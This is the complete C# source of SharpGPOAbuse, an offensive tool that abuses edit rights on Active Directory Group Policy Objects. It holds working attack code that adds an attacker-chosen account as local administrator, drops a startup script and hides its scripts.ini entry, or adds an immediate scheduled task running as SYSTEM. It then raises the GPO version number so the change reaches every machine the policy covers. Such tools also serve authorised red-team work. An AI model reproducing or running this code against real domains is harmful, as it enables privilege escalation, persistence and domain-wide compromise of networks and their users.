﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using CommandLine;
using System.Linq;

namespace SharpGPOAbuse
{
    public class Options
    {
        [Option("", "DomainController", Required = false, HelpText = "Set the domain controller to use.")]
        public string DomainController { get; set; }

        [Option("", "Domain", Required = false, HelpText = "Set the target domain.")]
        public string Domain { get; set; }

        [Option("", "UserAccount", Required = false, HelpText = "User to set as local admin via the GPO.")]
        public string UserAccount { get; set; }

        [Option("", "GpoName", Required = false, HelpText = "GPO to be edited. Need to have edit permission on the GPO.")]
        public string GpoName { get; set; }

        [Option("", "TaskName", Required = false, HelpText = "The name of the new immediate task.")]
        public string TaskName { get; set; }

        [Option("", "Author", Required = false, HelpText = "The author of the new immediate task. Use a domain admin.")]
        public string Author { get; set; }

        [Option("", "Command", Required = false, HelpText = "Command to execute via the immediate task.")]
        public string Command { get; set; }

        [Option("", "Arguments", Required = false, HelpText = "Command arguments of the immediate task.")]
        public string Arguments { get; set; }

        [Option("", "AddLocalAdmin", Required = false, HelpText = "Add new local admin.")]
        public bool AddLocalAdmin { get; set; }

        [Option("", "AddImmediateTask", Required = false, HelpText = "Add a new immediate task.")]
        public bool AddImmediateTask { get; set; }

        [Option("", "Force", Required = false, HelpText = "Overwrite existing files if required.")]
        public bool Force { get; set; }

        [Option("", "AddStartupScript", Required = false, HelpText = "Add new startup script.")]
        public bool AddStartupScript { get; set; }

        [Option("", "ScriptName", Required = false, HelpText = "New startup script name.")]
        public String ScriptName { get; set; }

        [Option("", "ScriptContents", Required = false, HelpText = "New startup script contents.")]
        public String ScriptContents { get; set; }

    }

    class Program
    {
        public static void PrintHelp()
        {
            string HelpText = "\nUsage: \n" +
                "\tSharpGPOAbuse.exe <AttackType> <AttackOptions>\n" +
                "\nAttack Types:\n" +
                "--AddLocalAdmin\n" +
                "\tAdd a new local admin. This will replace any existing local admins!\n" +
                "--AddStartupScript\n" +
                "\tAdd a new startup script\n" +
                "--AddImmediateTask\n" +
                "\tAdd a new immediate task\n" +
                "\n" +

                "\nOptions required to add a new local admin:\n" +
                "--UserAccount\n" +
                "\tSet the name of the account to be added in local admins.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOptions required to add a new startup script:\n" +
                "--ScriptName\n" +
                "\tSet the name of the new startup script.\n" +
                "--ScriptContents\n" +
                "\tSet the contents of the new startup script.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOptions required to add a new immediate task:\n" +
                "--TaskName\n" +
                "\tSet the name of the new task.\n" +
                "--Author\n" +
                "\tSet the author of the new task (use a DA account).\n" +
                "--Command\n" +
                "\tCommand to execute.\n" +
                "--Arguments\n" +
                "\tArguments passed to the command.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOther options:\n" +
                "--DomainController\n" +
                "\tSet the target domain controller.\n" +
                "--Domain\n" +
                "\tSet the target domain.\n" +
                "--Force\n" +
                "\tOverwrite existing files if required.\n" +
                "\n";

            Console.WriteLine(HelpText);
        }

        // Updage GPT.ini so that changes take effect without gpupdate /force
        public static void UpdateVersion(String Domain, String distinguished_name, String GPOName, String path, String function)
        {
            String line = "";
            List<string> new_list = new List<string>();

            if (!File.Exists(path))
            {
                Console.WriteLine("[-] Could not find GPT.ini. The group policy might need to be updated manually using 'gpupdate /force'");
            }

            // get the object of the GPO and update its versionNumber
            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain);
            myldapConnection.Path = "LDAP://" + distinguished_name;
            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
            search.Filter = "(displayName=" + GPOName + ")";
            string[] requiredProperties = new string[] { "versionNumber", "gPCMachineExtensionNames" };


            foreach (String property in requiredProperties)
                search.PropertiesToLoad.Add(property);

            System.DirectoryServices.SearchResult result = null;
            try
            {
                result = search.FindOne();
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message + "Exiting...");
                return;
            }

            int new_ver = 0;
            if (result != null)
            {
                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();

                //int new_versionNumber = 12345;
                //entryToUpdate.Properties["versionNumber"].Value = new_versionNumber;

                // get AD number of GPO and increase it by 1
                new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 1;
                entryToUpdate.Properties["versionNumber"].Value = new_ver;


                // update gPCMachineExtensionNames to add local admin
                if (function == "AddLocalAdmin")
                {
                    try
                    {
                        if (!entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"))
                        {
                            entryToUpdate.Properties["gPCMachineExtensionNames"].Value += "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
                        }
                    }
                    catch
                    {
                        entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
                    }
                }

                // update gPCMachineExtensionNames to add immediate task
                if (function == "NewImmediateTask")
                {
                    try
                    {
                        if (!entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
                        {
                            entryToUpdate.Properties["gPCMachineExtensionNames"].Value += "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
                        }
                    }
                    catch
                    {
                        entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
                    }
                }


                // update gPCMachineExtensionNames to add startup script
                if (function == "NewStartupScript")
                {
                    try
                    {
                        if (!entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains("[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"))
                        {
                            entryToUpdate.Properties["gPCMachineExtensionNames"].Value += "[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]";
                        }
                    }
                    catch
                    {
                        entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]";
                    }
                }



                try
                {
                    // Commit changes to the security descriptor
                    entryToUpdate.CommitChanges();
                    Console.WriteLine("[+] versionNumber attribute changed successfully");
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine("[!] Could not update versionNumber attribute!\nExiting...");
                    return;
                }
            }
            else
            {
                Console.WriteLine("[!] GPO not found!\nExiting...");
                System.Environment.Exit(0);
            }

            using (System.IO.StreamReader file = new System.IO.StreamReader(path))
            {
                while ((line = file.ReadLine()) != null)
                {
                    if (line.Replace(" ", "").Contains("Version="))
                    {
                        line = line.Split('=')[1];
                        line = "Version=" + Convert.ToString(new_ver);

                    }
                    new_list.Add(line);
                }
            }

            using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
            {
                foreach (string l in new_list)
                {
                    file2.WriteLine(l);
                }
            }
            Console.WriteLine("[+] The version number in GPT.ini was increased successfully.");
        }

        public static String GetGPOGUID(String DomainController, String GPOName, String distinguished_name)
        {
            // Translate GPO Name to GUID
            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
            System.DirectoryServices.Protocols.LdapConnection connection = null;
            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);
            connection.SessionOptions.Sealing = true;
            connection.SessionOptions.Signing = true;
            connection.Bind();
            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(displayName=" + GPOName + ")", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
            var GPOGuid = "";
            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
            {
                try
                {
                    GPOGuid = entry.Attributes["cn"][0].ToString();
                }
                catch
                {
                    Console.WriteLine("[!] Could not retrieve the GPO GUID. The GPO Name was invalid. \n[-] Exiting...");
                    System.Environment.Exit(0);
                }
            }
            if (String.IsNullOrEmpty(GPOGuid))
            {
                Console.WriteLine("[!] Could not retrieve the GPO GUID. The GPO Name was invalid. \n[-] Exiting...");
                System.Environment.Exit(0);
            }
            Console.WriteLine("[+] GUID of \"" + GPOName + "\" is: " + GPOGuid);
            return GPOGuid;
        }

        public static void NewLocalAdmin(String UserAccount, String Domain, String DomainController, String GPOName, String distinguished_name, bool Force)
        {
            // Get SID of user who will be local admin
            System.DirectoryServices.AccountManagement.PrincipalContext ctx = new System.DirectoryServices.AccountManagement.PrincipalContext(System.DirectoryServices.AccountManagement.ContextType.Domain, DomainController);
            System.DirectoryServices.AccountManagement.UserPrincipal usr = null;
            try
            {
                usr = System.DirectoryServices.AccountManagement.UserPrincipal.FindByIdentity(ctx, System.DirectoryServices.AccountManagement.IdentityType.SamAccountName, UserAccount);
                Console.WriteLine("[+] SID Value of " + UserAccount + " = " + usr.Sid.Value);
            }
            catch
            {
                Console.WriteLine("[-] Could not find user \"" + UserAccount + "\" in the " + Domain + " domain.\n[-] Exiting...\n");
                System.Environment.Exit(0);
            }

            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);

            string start = @"[Unicode]
Unicode=yes
[Version]
signature=""$CHICAGO$""
Revision=1";

            string[] text = { "[Group Membership]", "*S-1-5-32-544__Memberof =", "*S-1-5-32-544__Members = *" + usr.Sid.Value };

            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
            String GPT_path = path + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(path))
            {
                path += "\\Machine\\Microsoft\\Windows NT\\SecEdit\\";
            }
            else
            {
                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
                System.Environment.Exit(0);
            }

            // check if the folder structure for adding admin user exists in SYSVOL
            if (!Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }
            path += "GptTmpl.inf";
            if (File.Exists(path))
            {
                bool exists = false;
                Console.WriteLine("[+] File exists: " + path);
                string[] readText = File.ReadAllLines(path);

                foreach (string s in readText)
                {
                    // Check if memberships are defined via group policy
                    if (s.Contains("[Group Membership]"))
                    {
                        exists = true;
                    }
                }

                // if memberships are defined and force is NOT used
                if (exists && !Force)
                {
                    Console.WriteLine("[!] Group Memberships are already defined in the GPO. Use --force to make changes. This option might break the affected systems!\n[-] Exiting...");
                    System.Environment.Exit(0);
                }

                // if memberships are defined and force is used
                if (exists && Force)
                {
                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
                    {
                        foreach (string l in readText)
                        {
                            if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members="))
                            {
                                if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") > 0))
                                {
                                    file2.WriteLine(l + ", *" + usr.Sid.Value);
                                }
                                else if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") == 0))
                                {
                                    file2.WriteLine(l + " *" + usr.Sid.Value);
                                }
                            }
                            else
                            {
                                file2.WriteLine(l);
                            }
                        }
                    }
                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin");
                    Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!");
                    System.Environment.Exit(0);
                }

                // if memberships are not defined
                if (!exists)
                {
                    Console.WriteLine("[+] The GPO does not specify any group memberships.");
                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
                    {
                        foreach (string l in readText)
                        {
                            file2.WriteLine(l);
                        }
                        foreach (string l in text)
                        {
                            file2.WriteLine(l);
                        }
                    }
                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin");
                    Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!");
                }
            }
            else
            {
                Console.WriteLine("[+] Creating file " + path);
                String new_text = null;
                foreach (String x in text)
                {
                    new_text += Environment.NewLine + x;
                }
                System.IO.File.WriteAllText(path, start + new_text);
                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin");
                Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!");
            }
        }

        public static void NewStartupScript(String ScriptName, String ScriptContents, String Domain, String DomainController, String GPOName, String distinguished_name)
        {
            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);

            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
            String hidden_path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;

            String hidden_ini = Environment.NewLine + "[Startup]" + Environment.NewLine + "0CmdLine=" + ScriptName + Environment.NewLine + "0Parameters=" + Environment.NewLine;

            String GPT_path = path + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(path))
            {
                path += "\\Machine\\Scripts\\Startup\\";
                hidden_path += "\\Machine\\Scripts\\scripts.ini";
            }
            else
            {
                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
                System.Environment.Exit(0);
            }

            // check if the folder structure for adding admin user exists in SYSVOL
            if (!Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }
            path += ScriptName;
            if (File.Exists(path))
            {
                Console.WriteLine("[!] A Startup script with the same name already exists. Choose a different name.\n[-] Exiting...\n");
                System.Environment.Exit(0);
            }

            if (File.Exists(hidden_path))
            {
                // Remove the hidden attribute of the file
                var attributes = File.GetAttributes(hidden_path);
                if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    attributes &= ~FileAttributes.Hidden;
                    File.SetAttributes(hidden_path, attributes);
                }

                String line;
                List<string> new_list = new List<string>();
                using (System.IO.StreamReader file = new System.IO.StreamReader(hidden_path))
                {
                    while ((line = file.ReadLine()) != null)
                    {
                        new_list.Add(line);
                    }
                }

                List<int> first_element = new List<int>();

                String q = "";
                foreach (String item in new_list)
                {
                    try
                    {
                        q = Regex.Replace(item[0].ToString(), "[^0-9]", "");
                        first_element.Add(Int32.Parse(q));
                    }
                    catch { continue; }

                }

                int max = first_element.Max() + 1;
                new_list.Add(hidden_ini = max.ToString() + "CmdLine=" + ScriptName + Environment.NewLine + max.ToString() + "Parameters=");

                using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(hidden_path))
                {
                    foreach (string l in new_list)
                    {
                        file2.WriteLine(l);
                    }
                }
                //Add the hidden attribute of the file
                File.SetAttributes(hidden_path, File.GetAttributes(hidden_path) | FileAttributes.Hidden);
            }

            else
            {
                System.IO.File.WriteAllText(hidden_path, hidden_ini);
                //Add the hidden attribute of the file
                var attributes = File.GetAttributes(hidden_path);
                File.SetAttributes(hidden_path, File.GetAttributes(hidden_path) | FileAttributes.Hidden);

            }

            Console.WriteLine("[+] Creating new startup script...");
            System.IO.File.WriteAllText(path, ScriptContents);
            UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewStartupScript");
            Console.WriteLine("[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.\n[+] Done!");
        }

        public static void NewImmediateTask(String Domain, String DomainController, String GPOName, String distinguished_name, String task_name, String author, String arguments, String command, bool Force)
        {
            string start = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">";
            string end = @"</ScheduledTasks>";
            string ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString());

            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);
            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
            String GPT_path = path + "\\GPT.ini";
            // Check if GPO path exists
            if (Directory.Exists(path))
            {
                path += "\\Machine\\Preferences\\ScheduledTasks\\";
            }
            else
            {
                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
                System.Environment.Exit(0);
            }

            // check if the folder structure for adding scheduled tasks exists in SYSVOL
            if (!Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }
            path += "ScheduledTasks.xml";

            // if the ScheduledTasks.xml exists then append the new immediate task
            if (File.Exists(path))
            {
                if (Force)
                {
                    Console.WriteLine("[+] Modifying " + path);
                    String line;
                    List<string> new_list = new List<string>();
                    using (System.IO.StreamReader file = new System.IO.StreamReader(path))
                    {
                        while ((line = file.ReadLine()) != null)
                        {
                            if (line.Replace(" ", "").Contains("</ScheduledTasks>"))
                            {
                                line = ImmediateTaskXML + line;
                            }
                            new_list.Add(line);
                        }
                    }

                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
                    {
                        foreach (string l in new_list)
                        {
                            file2.WriteLine(l);
                        }
                    }
                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask");
                    Console.WriteLine("[+] The GPO was modified to include a new scheduled task. Wait for the GPO refresh cycle.\n[+] Done!");
                    System.Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("[!] The GPO already includes a ScheduledTasks.xml. Use --Force to append to ScheduledTasks.xml or choose another GPO.\n[-] Exiting...\n");
                    System.Environment.Exit(0);
                }
            }
            else
            {
                Console.WriteLine("[+] Creating file " + path);
                System.IO.File.WriteAllText(path, start + ImmediateTaskXML + end);
                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask");
                Console.WriteLine("[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.\n[+] Done!");
            }
        }

        static void Main(string[] args)
        {
            if (args == null)
            {
                PrintHelp();
                return;
            }

            bool Force = false;

            String Domain = "";
            String DomainController = "";
            String UserAccount = "";
            String GPOName = "";

            String task_name = "";
            String author = "";
            String arguments = "";
            String command = "";
            bool AddLocalAdmin = false;
            bool AddImmediateTask = false;

            String ScriptContents = "";
            String ScriptName = "";
            bool AddStartupScript = false;

            var Options = new Options();

            if (CommandLineParser.Default.ParseArguments(args, Options))
            {
                if (args.Length == 0)
                {
                    PrintHelp();
                    return;
                }
                // check that only one attack was specified
                if ((Options.AddLocalAdmin && Options.AddImmediateTask) && Options.AddStartupScript)
                {
                    Console.WriteLine("[!] You can only specify one attack at a time.\n[-] Exiting\n");
                    return;
                }

                //check that the name of the GPO to edit was provided
                if (string.IsNullOrEmpty(Options.GpoName))
                {
                    Console.Write("[!] You need to provide the name of the GPO to edit.\n[!] Exiting...\n");
                    return;
                }
                GPOName = Options.GpoName;

                // check that the necessary options for adding a new local admin were provided
                if (Options.AddLocalAdmin)
                {
                    AddLocalAdmin = true;
                    if (string.IsNullOrEmpty(Options.UserAccount))
                    {
                        Console.WriteLine("[!] To add a new local admin the following options are needed:\n\t--UserAccount\n\n[-] Exiting...");
                        return;
                    }
                    UserAccount = Options.UserAccount;
                }

                // check that the necessary options for adding a new startup script were provided
                if (Options.AddStartupScript)
                {
                    AddStartupScript = true;
                    if (string.IsNullOrEmpty(Options.ScriptName))
                    {
                        Console.WriteLine("[!] To add a new startup script the following options are needed:\n\t--ScriptName\n\t--ScriptContents\n\n[-] Exiting...");
                        return;
                    }
                    if (string.IsNullOrEmpty(Options.ScriptContents))
                    {
                        Console.WriteLine("[!] To add a new startup script the following options are needed:\n\t--ScriptName\n\t--ScriptContents\n\n[-] Exiting...");
                        return;
                    }
                    ScriptContents = Options.ScriptContents;
                    ScriptName = Options.ScriptName;

                }

                //check that the necessary options for adding a new scheduled task were provided
                if (Options.AddImmediateTask)
                {
                    AddImmediateTask = true;
                    if (string.IsNullOrEmpty(Options.TaskName) || string.IsNullOrEmpty(Options.Author) || string.IsNullOrEmpty(Options.Arguments) || string.IsNullOrEmpty(Options.Command))
                    {
                        Console.WriteLine("[!] To add a new immediate task the following options are needed:\n\t--Author\n\t--TaskName\n\t--Arguments\n\t--Command.\n\n[-] Exiting...");
                        return;
                    }
                    task_name = Options.TaskName;
                    author = Options.Author;
                    arguments = Options.Arguments;
                    command = Options.Command;
                }

                if (!string.IsNullOrEmpty(Options.DomainController))
                {
                    DomainController = Options.DomainController;
                }
                if (!string.IsNullOrEmpty(Options.Domain))
                {
                    Domain = Options.Domain;
                }
                if (Options.Force)
                {
                    Force = true;
                }
            }
            else
            {
                Console.Write("[!] Unknown argument error.\n[!] Exiting...\n");
                return;
            }

            System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
            if (Domain == String.Empty)
            {
                try
                {
                    current_domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
                }
                catch
                {
                    Console.WriteLine("[!] Cannot enumerate domain.\n");
                    return;
                }
            }

            if (DomainController == String.Empty)
            {
                DomainController = current_domain.PdcRoleOwner.Name;
            }

            if (Domain == String.Empty)
            {
                Domain = current_domain.Name;
            }

            String[] DC_array = null;
            String distinguished_name = null;
            distinguished_name = "CN=Policies,CN=System";
            DC_array = Domain.Split('.');

            foreach (String DC in DC_array)
            {
                distinguished_name += ",DC=" + DC;
            }
            Domain = Domain.ToLower();

            Console.WriteLine("[+] Domain = " + Domain);
            Console.WriteLine("[+] Domain Controller = " + DomainController);
            Console.WriteLine("[+] Distinguished Name = " + distinguished_name);

            // Add new local admin
            if (AddLocalAdmin)
            {
                NewLocalAdmin(UserAccount, Domain, DomainController, GPOName, distinguished_name, Force);
            }

            // Add new scheduled task
            if (AddImmediateTask)
            {
                NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force);
            }

            // Add new startup script
            if (AddStartupScript)
            {
                NewStartupScript(ScriptName, ScriptContents, Domain, DomainController, GPOName, distinguished_name);
            }


        }
    }
}